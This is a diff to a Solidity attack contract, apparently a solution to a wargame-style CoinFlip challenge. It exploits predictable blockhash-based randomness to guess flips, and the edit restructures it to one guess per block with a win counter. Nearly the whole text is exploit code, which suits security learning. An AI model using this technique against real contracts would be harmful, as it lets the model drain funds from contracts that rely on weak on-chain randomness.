@@ -6,6 +6,7 @@ import {CoinFlip} from "../victims/CoinFlip.sol";
 contract AttackCoinFlip {
     CoinFlip victim;
     address public owner;
+    uint256 public consecutiveWins;
 
     uint256 lastHash;
     uint256 FACTOR =
@@ -14,12 +15,13 @@ contract AttackCoinFlip {
     constructor(CoinFlip _victim) {
         victim = _victim;
         owner = msg.sender;
+        consecutiveWins = 0;
     }
 
     function attack() external {
-        for (uint256 i = 0; i < 10; i++) {
-            callVictimWithFlip();
-        }
+        require(consecutiveWins < 10, "Attack already suceeded");
+
+        callVictimWithFlip();
     }
 
     function callVictimWithFlip() internal {
@@ -31,9 +33,9 @@ contract AttackCoinFlip {
     function makeGuess() internal returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
 
-        // if (lastHash == blockValue) {
-        //     revert();
-        // }
+        if (lastHash == blockValue) {
+            revert();
+        }
 
         lastHash = blockValue;
         uint256 coinFlip = blockValue / FACTOR;
